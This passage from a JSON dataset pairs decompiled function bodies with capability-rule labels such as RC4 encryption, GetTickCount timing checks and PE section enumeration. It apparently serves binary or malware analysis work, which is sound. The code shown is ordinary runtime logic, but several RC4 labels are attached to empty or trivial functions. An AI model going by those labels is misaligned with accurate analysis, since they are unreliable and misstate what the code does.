iVar3;\n                                }\n                                uVar2 = *(in_EAX + -7);\n                                uVar1 = *(param_1 + -7);\n                                if ((uVar2 != uVar1) &&\n                                   (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                    return iVar3;\n                                }\n                                iVar3 = *(in_EAX + -6) - *(param_1 + -6);\n                                if (iVar3 != 0) {\n                                    iVar3 = (0 < iVar3) * 2 + -1;\n                                }\n                            }\n                            if (iVar3 == 0) {\n                                if (*(in_EAX + -5) == *(param_1 + -5)) {\n                                    iVar3 = 0;\n                                }\n                                else {\n                                    uVar2 = *(in_EAX + -5) & 0xff;\n                                    uVar1 = *(param_1 + -5);\n                                    if ((uVar2 != uVar1) &&\n                                       (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                        return iVar3;\n                                    }\n                                    uVar2 = *(in_EAX + -4);\n                                    uVar1 = *(param_1 + -4);\n                                    if ((uVar2 != uVar1) &&\n                                       (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                        return iVar3;\n                                    }\n                                    uVar2 = *(in_EAX + -3);\n                                    uVar1 = *(param_1 + -3);\n                                    if ((uVar2 != uVar1) &&\n                                       (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                        return iVar3;\n                                    }\n                                    iVar3 = *(in_EAX + -2) - *(param_1 + -2);\n                                    if (iVar3 != 0) {\n                                        iVar3 = (0 < iVar3) * 2 + -1;\n                                    }\n                                }\n                                if ((iVar3 == 0) && (iVar3 = *(in_EAX + -1) - *(param_1 + -1),  iVar3 != 0)) {\n                                    iVar3 = (0 < iVar3) * 2 + -1;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1860
    },
    "004904f4": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004904f4(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "004962b9": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint fcn.004962b9(uint param_1)\n\n{\n    return param_1;\n}\n",
        "token_count": 22
    },
    "00624a93": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00624a93(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "004a8365": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004a8365(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "006670db": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint fcn.006670db(void)\n\n{\n    uint in_EAX;\n    \n    return in_EAX;\n}\n",
        "token_count": 25
    },
    "006771f9": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint fcn.006771f9(void)\n\n{\n    uint in_EAX;\n    \n    return in_EAX;\n}\n",
        "token_count": 26
    },
    "006be785": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.006be785(void)\n\n{\n    uint var_1h;\n    \n    return;\n}\n",
        "token_count": 23
    },
    "004109c6": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004109c6(uint param_1, uint param_2)\n\n{\n    uint unaff_EDI;\n    uint var_18h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    fcn.004e4dc8(param_2, &var_18h);\n    fcn.00525db6();\n    fcn.00410f95(unaff_EDI);\n    return;\n}\n",
        "token_count": 110
    },
    "00442870": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Switch with 1 destination removed at 0x00442a21 : 208 cases all go to same destination\n\nuint __cdecl fcn.00442870(uint8_t *arg_8h, uint8_t **arg_ch)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint8_t *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    bVar2 = false;\n    iVar8 = 4;\n    var_4h = 0;\n    var_8h = 4;\n    var_ch = NULL;\n    if (arg_8h != NULL) {\n        *arg_ch = NULL;\n        arg_ch[1] = NULL;\n        arg_ch[2] = NULL;\n        uVar4 = *arg_8h;\n        uVar6 = uVar4;\n        puVar1 = arg_8h;\n        if (uVar6 < 0x100) {\ncode_r0x004428b0:\n            puVar7 = puVar1 + 1;\n            switch(*(*(uVar6 + 0x442a88) * 4 + 0x442a28)) {\n            case 0x4428be:\n                goto code_r0x004428e1;\n            case 0x4428c3:\n                iVar8 = 2;\n                goto code_r0x004428e1;\n            case 0x4428cd:\n                var_8h = 2;\n                goto code_r0x004428e1;\n            case 0x4428d9:\n                goto code_r0x004428e1;\n            case 0x4428de:\ncode_r0x004428e1:\n                uVar4 = *puVar7;\n                uVar6 = uVar4;\n                puVar1 = puVar7;\n                if (0xff < uVar6) {\n                    return 0;\n                }\n                goto code_r0x004428b0;\n            case 0x4428ef:\n                goto code_r0x004428ef;\n            case 0x4428f8:\n                iVar3 = iVar8;\n                goto code_r0x0044298f;\n            case 0x4428ff:\n                arg_ch[2] = 0x1;\n                var_ch = puVar7 + -arg_8h;\ncode_r0x00442911:\n                iVar3 = 1;\n                break;\n            case 0x442911:\n                goto code_r0x00442911;\n            case 0x442918:\n                if ((*puVar7 & 0x38) != 0) {\n                    return 0;\n                }\n                goto code_r0x0044298f;\n            case 0x44291f:\n                iVar3 = iVar8 + 2;\n                break;\n            case 0x442924:\n                if (iVar8 == 2) {\n                    return 0;\n                }\n                var_ch = puVar7 + -arg_8h;\n                iVar3 = iVar8;\n                break;\n            case 0x442935:\n                iVar3 = 1;\n                goto code_r0x0044298f;\n            case 0x44293c:\n                if ((*puVar7 & 0x38) != 0) {\n                    return 0;\n                }\n                bVar2 = true;\n                iVar3 = iVar8;\n                if ((uVar4 & 1) == 0) goto code_r0x00442911;\n                break;\n            case 0x44294d:\n                iVar3 = 3;\n                break;\n            case 0x442954:\n                iVar3 = 2;\n                break;\n            case 0x44295b:\n                bVar2 = true;\n                if ((*puVar7 & 0x38) < 0x10) goto code_r0x00442968;\n                break;\n            case 0x442968:\ncode_r0x00442968:\n                if ((uVar4 & 1) == 0) goto code_r0x00442911;\n            case 0x44296d:\n                iVar3 = iVar8;\n                break;\n            case 0x442971:\n                if (8 < (*puVar7 & 0x38)) {\n                    return 0;\n                }\n                goto code_r0x0044298f;\n            case 0x442981:\n                if ((*puVar7 & 0x38) == 0x38) {\n                    return 0;\n                }\ncode_r0x0044298f:\n                bVar2 = true;\n                break;\n            case 0x44298f:\n                goto code_r0x0044298f;\n            case 0x442a0c:\n                return 0;\n            }\n            if (bVar2) {\n                uVar4 = *puVar7;\n                uVar5 = uVar4 & 0xc0;\n                puVar7 = puVar1 + 2;\n                uVar4 = uVar4 & 7;\n                if (uVar5 != 0xc0) {\n                    if (uVar5 == 0x40) {\n                        var_4h = 1;\n                    }\n                    else if (uVar5 == 0x80) {\n                        var_4h = var_8h;\n                    }\n                    if (var_8h == 2) {\n                        if ((uVar5 == 0) && (uVar4 == 6)) {\n                            var_4h = var_4h + 2;\n                        }\n                    }\n                    else {\n                        if (uVar4 == 4) {\n                            uVar4 = *puVar7;\n                            puVar7 = puVar1 + 3;\n                            uVar4 = uVar4 & 7;\n                        }\n                        if ((uVar5 == 0) && (uVar4 == 5)) {\n                            var_4h = var_4h + 4;\n                        }\n                    }\n                    goto code_r0x004429f1;\n                }\n            }\n            var_4h = 0;\ncode_r0x004429f1:\n            *arg_ch = puVar7 + (iVar3 - arg_8h) + var_4h;\n            arg_ch[1] = var_ch;\n            return CONCAT31(var_ch >> 8, 1);\n        }\n    }\ncode_r0x004428ef:\n    return 0;\n}\n",
        "token_count": 1448
    },
    "0057ed8e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0050b8db)\n\nuint fcn.0057ed8e(uint param_1, int32_t param_2, int32_t *param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar3 = func_0x006797ec();\n    iVar3 = *(iVar3 + 0x30);\n    iVar1 = fcn.005e2722(param_1, param_2);\n    if (iVar1 == 0) {\n        uVar2 = (**(iVar3 + 0x48))(param_1, param_2, param_3, param_4);\n        return uVar2;\n    }\n    if (param_3 != NULL) {\n        *param_3 = iVar1;\n    }\n    if (param_4 != NULL) {\n        *param_4 = *(param_2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 221
    },
    "00405f33": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405f33(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.004074ba(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 97
    },
    "00406c26": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.00406c26(code **param_1)\n\n{\n    *param_1 = vtable.CFileFind.0;\n    fcn.00403540();\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    *(param_1 + 5) = 0x5c;\n    return param_1;\n}\n",
        "token_count": 94
    },
    "00409cf7": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409cf7(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.00405af2(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.0040a879();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 122
    },
    "00409fc2": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409fc2(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.0040a879();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 102
    },
    "0040e77c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.0040e77c(code **param_1)\n\n{\n    param_1[5] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    fcn.00410762();\n    return param_1;\n}\n",
        "token_count": 145
    },
    "00429c3b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00429c3b(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.00429c07();\n    *param_1 = 0x38;\n    param_1[2] = 0x400000;\n    param_1[1] = 0x400000;\n    param_1[3] = 0x900;\n    param_1[4] = 0x43020c;\n    iVar1 = fcn.00429bbc();\n    if (iVar1 < 0) {\n        *0x437308 = 1;\n    }\n    return param_1;\n}\n",
        "token_count": 144
    },
    "00403f00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403f00(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00403db0(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 103
    },
    "00404070": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00404070(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_2 == NULL) {\n        fcn.00403a00(0, 0);\n        return param_1;\n    }\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00403a00(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 145
    },
    "00405ac3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405ac3(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.00410ecb(arg_8h);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x435094 == NULL) break;\n        iVar1 = (**0x435094)(arg_8h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "0040650d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040650d(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    if (-1 < arg_8h) goto code_r0x00406522;\n    do {\n        fcn.00405f96();\ncode_r0x00406522:\n        if (arg_8h < *(in_ECX + 8)) goto code_r0x0040654b;\n    } while (((*(in_ECX + 0xc) <= arg_8h) && (*(in_ECX + 4) <= arg_ch)) &&\n            (arg_ch < *(in_ECX + 4) + *(in_ECX + 0xc) * 4));\n    fcn.0040626e(arg_8h + 1, 0xffffffff);\ncode_r0x0040654b:\n    fcn.00403eb0(arg_ch);\n    return;\n}\n",
        "token_count": 204
    },
    "00406a50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a50(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint *puVar2;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = &var_10h;\n    iVar1 = func_0x005533be(puVar2, arg_8h, puVar2);\n    if (iVar1 != 0) goto code_r0x00406a7d;\n    do {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n        puVar2 = 0x80070057;\n        fcn.00401000();\ncode_r0x00406a7d:\n        iVar1 = func_0x005c4b65(&stack0xfffffffc, &var_10h, &var_20h, puVar2);\n    } while (iVar1 == 0);\n    fcn.004069f3(&var_20h, arg_ch);\n    *in_ECX = var_8h;\n    in_ECX[1] = var_4h;\n    return;\n}\n",
        "token_count": 271
    },
    "00407074": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00407074(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint unaff_EBP;\n    \n    if (param_1 != NULL) goto code_r0x00407082;\n    do {\n        fcn.00405f96();\n        param_1 = extraout_ECX;\ncode_r0x00407082:\n        iVar1 = (***param_1)();\n    } while (iVar1 == 0);\n    if (iVar1 != 0) goto code_r0x00407059;\n    do {\n        iVar1 = fcn.00405f96(unaff_EBP);\ncode_r0x00407059:\n    } while (param_2 == 0);\n    do {\n        if (iVar1 == param_2) {\n            return 1;\n        }\n        iVar1 = *(iVar1 + 0x10);\n    } while (iVar1 != 0);\n    return 0;\n}\n",
        "token_count": 222
    },
    "00408ad0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00408ad0(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(0xc);\n    if ((~*(extraout_ECX + 0x18) & 1) == 0) {\n        if (*(extraout_ECX + 0x38) != 0) goto code_r0x00408bbe;\n        iVar1 = fcn.00405ac3(0x14);\n        *(unaff_EBP + -0x18) = iVar1;\n        *(unaff_EBP + -4) = 1;\n        if (iVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = fcn.0040a092();\n        }\n        arg_ch = *(extraout_ECX + 0x40);\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(extraout_ECX + 0x38) = uVar2;\n        fcn.0040a0b9(1, arg_ch);\n        iVar1 = *(extraout_ECX + 0x38);\n        if (0 < *(iVar1 + 8)) goto code_r0x00408b97;\n        do {\n            iVar1 = fcn.00405f96();\ncode_r0x00408b97:\n            **(iVar1 + 4) = 0;\n            *(extraout_ECX + 0x34) = 1;\n            *(unaff_EBP + -0x10) = 0;\n            fcn.004089fc(unaff_EBP + -0x10);\n            *(unaff_EBP + -0x18) = 0;\n            fcn.00408792(0, unaff_EBP + -0x18, 1);\ncode_r0x00408bbe:\n            if (*(unaff_EBP + 8) == 0) goto code_r0x00408c07;\n            fcn.0040860a();\n            fcn.0040a1df(*(extraout_ECX + 0x34), *(unaff_EBP + 8), 1);\n            *(unaff_EBP + -0x14) = 0;\n            fcn.00409dc2(1, unaff_EBP + -0x14);\n        } while (*(unaff_EBP + -0x14) == 0);\n        uVar2 = *(extraout_ECX + 0x34);\n        *(unaff_EBP + 8) = 2;\n        fcn.00408792(uVar2, unaff_EBP + 8, 1);\n    }\n    else {\n        if (*(extraout_ECX + 0x38) == 0) {\n            iVar1 = fcn.00405ac3(0x1c);\n            *(unaff_EBP + -0x18) = iVar1;\n            *(unaff_EBP + -4) = 0;\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.00409eb6(*(extraout_ECX + 0x40));\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            *(extraout_ECX + 0x38) = uVar2;\n            fcn.00409c99(*(extraout_ECX + 0x44), 1);\n            puVar3 = fcn.00409f44(0);\n            *puVar3 = 0;\n            *(extraout_ECX + 0x34) = 1;\n        }\n        if (*(unaff_EBP + 8) == 0) goto code_r0x00408c07;\n        fcn.0040860a();\n        puVar3 = fcn.00409f44(*(unaff_EBP + 8));\n        *puVar3 = *(extraout_ECX + 0x34);\n    }\n    *(extraout_ECX + 0x34) = *(extraout_ECX + 0x34) + 1;\ncode_r0x00408c07:\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 1043
    },
    "00409d42": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00409d42(uint32_t arg_8h, uint32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    uint *puVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    \n    *arg_10h = arg_8h >> 4;\n    uVar2 = (arg_8h >> 4) % *(in_ECX + 8);\n    *arg_ch = uVar2;\n    if (*(in_ECX + 4) != 0) {\n        for (puVar1 = *(*(in_ECX + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == arg_8h) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 196
    },
    "00409d7d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409d7d(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    uint *puVar1;\n    \n    if (in_ECX == 0) {\n        fcn.00405f96();\n        in_ECX = extraout_ECX;\n    }\n    if (*(in_ECX + 4) != 0) {\n        for (puVar1 = *(*(in_ECX + 4) + ((arg_8h >> 4) % *(in_ECX + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == arg_8h) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 184
    },
    "00409deb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00409deb(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint *arg_8h_00;\n    int32_t in_ECX;\n    uint *puVar2;\n    \n    if (*(in_ECX + 4) == 0) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        puVar2 = *(in_ECX + 4) + ((arg_8h >> 4) % *(in_ECX + 8)) * 4;\n        puVar1 = *puVar2;\n        while (arg_8h_00 = puVar1,  arg_8h_00 != NULL) {\n            if (arg_8h_00[1] == arg_8h) {\n                *puVar2 = *arg_8h_00;\n                fcn.00409d24(arg_8h_00);\n                return 0x1;\n            }\n            puVar2 = arg_8h_00;\n            puVar1 = *arg_8h_00;\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 250
    },
    "0040a00b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a00b(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    \n    if (param_1 != 0) goto code_r0x0040a014;\n    do {\n        fcn.00405f96();\n        param_1 = extraout_ECX;\ncode_r0x0040a014:\n        arg_8h = *(param_1 + 4);\n    } while (arg_8h == NULL);\n    iVar1 = *arg_8h;\n    iVar2 = arg_8h[2];\n    *(param_1 + 4) = iVar1;\n    if (iVar1 == 0) {\n        *(param_1 + 8) = 0;\n    }\n    else {\n        *(iVar1 + 4) = 0;\n    }\n    fcn.00409fe4(arg_8h);\n    return iVar2;\n}\n",
        "token_count": 227
    },
    "0040a879": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a879(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.00405af2(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0040c281": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c281(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX;\n    int32_t unaff_ESI;\n    \n    iVar2 = 0x7fffffff;\n    iVar1 = unaff_ESI;\n    if (arg_8h == 0x7fffffff) goto code_r0x0040c2a4;\n    if (*in_ECX == 0x7fffffff) goto code_r0x0040c2a2;\n    if (*in_ECX == arg_8h) goto code_r0x0040c2a2;\n    do {\n        iVar2 = fcn.00405f96();\n        in_ECX = extraout_ECX;\ncode_r0x0040c2a2:\n        *in_ECX = arg_8h;\n        iVar1 = unaff_ESI;\ncode_r0x0040c2a4:\n        arg_8h = iVar1;\n        unaff_ESI = arg_8h;\n    } while (*in_ECX == iVar2);\n    fcn.00409999(*in_ECX);\n    return;\n}\n",
        "token_count": 271
    },
    "0040d912": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d912(void)\n\n{\n    int32_t iVar1;\n    code *unaff_EDI;\n    uint var_1ch;\n    \n    func_0x0052dd33();\n    while( true ) {\n        iVar1 = (*unaff_EDI)(&var_1ch, 0, 0x121, 0x121, 1);\n        if (iVar1 == 0) break;\n        (**0x42c3b8)(&var_1ch);\n    }\n    fcn.0040d3bd();\n    return;\n}\n",
        "token_count": 126
    },
    "0040e671": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e671(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x20),  *(param_1 + 0x20) != 0)) {\n        do {\n            arg_8h = iVar1;\n            iVar1 = fcn.0040e627(arg_8h);\n        } while (iVar1 != 0);\n        uVar2 = fcn.0040d463(arg_8h);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 152
    },
    "00415498": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00415498(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x432c50, 0xc);\n    fcn.00415f91(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x439150;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x43914c;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004154dc;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00410dee(arg_8h_00);\ncode_r0x004154dc:\n        fcn.00410dee(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004154ff();\n    fcn.0041471d();\n    return;\n}\n",
        "token_count": 390
    },
    "0041e150": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0041e150(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uchar *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint uVar6;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.0041102a(arg_1ch);\n    if ((in_EAX == NULL) || (arg_8h == 0)) {\n        puVar1 = fcn.004125de();\n        uVar6 = 0x16;\n    }\n    else {\n        iVar2 = arg_ch;\n        if (arg_ch < 1) {\n            iVar2 = 0;\n        }\n        if (iVar2 + 9U < arg_8h) {\n            if (arg_18h != '\\0') {\n                fcn.0041e10b();\n            }\n            puVar4 = in_EAX;\n            if (*arg_14h == 0x2d) {\n                *in_EAX = 0x2d;\n                puVar4 = in_EAX + 1;\n            }\n            puVar5 = puVar4;\n            if (0 < arg_ch) {\n                puVar5 = puVar4 + 1;\n                *puVar4 = *puVar5;\n                *puVar5 = ***(var_10h + 0xbc);\n            }\n            puVar5 = puVar5 + (arg_18h == '\\0') + arg_ch;\n            if (arg_8h == 0xffffffff) {\n                puVar4 = 0xffffffff;\n            }\n            else {\n                puVar4 = in_EAX + (arg_8h - puVar5);\n            }\n            iVar2 = fcn.0041291c(puVar5, puVar4, \"e+000\");\n            if (iVar2 != 0) {\n                fcn.00415914(0, 0, 0, 0, 0);\n            }\n            if (arg_10h != 0) {\n                *puVar5 = 0x45;\n            }\n            if (*arg_14h[3] != '0') {\n                iVar2 = arg_14h[1] + -1;\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                    puVar5[1] = 0x2d;\n                }\n                if (99 < iVar2) {\n                    iVar3 = iVar2 / 100;\n                    iVar2 = iVar2 % 100;\n                    puVar5[2] = puVar5[2] + iVar3;\n                }\n                if (9 < iVar2) {\n                    iVar3 = iVar2 / 10;\n                    iVar2 = iVar2 % 10;\n                    puVar5[3] = puVar5[3] + iVar3;\n                }\n                puVar5[4] = puVar5[4] + iVar2;\n            }\n            if (((*0x439bac & 1) != 0) && (puVar5[2] == '0')) {\n                fcn.00415a80(puVar5 + 2, puVar5 + 3, 3);\n            }\n            if (var_4h != '\\0') {\n                *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n            }\n            return 0;\n        }\n        puVar1 = fcn.004125de();\n        uVar6 = 0x22;\n    }\n    *puVar1 = uVar6;\n    fcn.00415a3c(0, 0, 0, 0, 0);\n    if (var_4h != '\\0') {\n        *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n    }\n    return uVar6;\n}\n",
        "token_count": 928
    },
    "004296f2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004296f2(uint param_1)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = 0;\n    fcn.00429586(0);\n    while (*0x439ccc != NULL) {\n        *0x439ccc = **0x439ccc;\n        uVar1 = 1;\n        fcn.004295f4(1);\n    }\n    fcn.004295ae(uVar1, param_1);\n    return;\n}\n",
        "token_count": 129
    },
    "00445060": {
        "rules": [
            "contain loop"
        ],
